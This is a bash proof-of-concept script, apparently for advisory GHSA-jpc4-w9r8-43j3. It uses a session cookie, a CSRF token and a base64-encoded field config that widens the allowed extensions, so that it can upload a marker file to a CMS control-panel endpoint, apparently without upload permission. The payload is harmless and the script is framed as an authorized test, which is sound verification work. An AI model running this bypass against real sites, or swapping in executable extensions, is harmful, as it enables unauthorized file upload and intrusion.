#!/usr/bin/env bash
set -euo pipefail

if [[ $# -lt 3 || $# -gt 4 ]]; then
  echo "Usage: $0 <base-url> <session-cookie> <csrf-token> [container]" >&2
  exit 2
fi

base_url="${1%/}"
session_cookie="$2"
csrf_token="$3"
container="${4:-assets}"

marker_file="$(mktemp --suffix=.proof)"
trap 'rm -f -- "$marker_file"' EXIT
printf 'GHSA-jpc4-w9r8-43j3 authorized test\n' > "$marker_file"

# {"type":"files","allowed_extensions":["proof"]}
field_config='eyJ0eXBlIjoiZmlsZXMiLCJhbGxvd2VkX2V4dGVuc2lvbnMiOlsicHJvb2YiXX0='

echo "[*] Target: $base_url"
echo "[*] Container: $container"
echo "[*] Uploading a harmless .proof marker"

curl --fail-with-body --silent --show-error \
  -X POST "$base_url/cp/fieldtypes/files/upload" \
  -H 'Accept: application/json' \
  -H "Cookie: $session_cookie" \
  -F "_token=$csrf_token" \
  -F "container=$container" \
  -F "config=$field_config" \
  -F "file=@$marker_file;filename=ghsa-jpc4-w9r8-43j3.proof;type=text/plain"

printf '\n[+] Request completed. Confirm the HTTP response and verify the account lacks upload permission.\n'
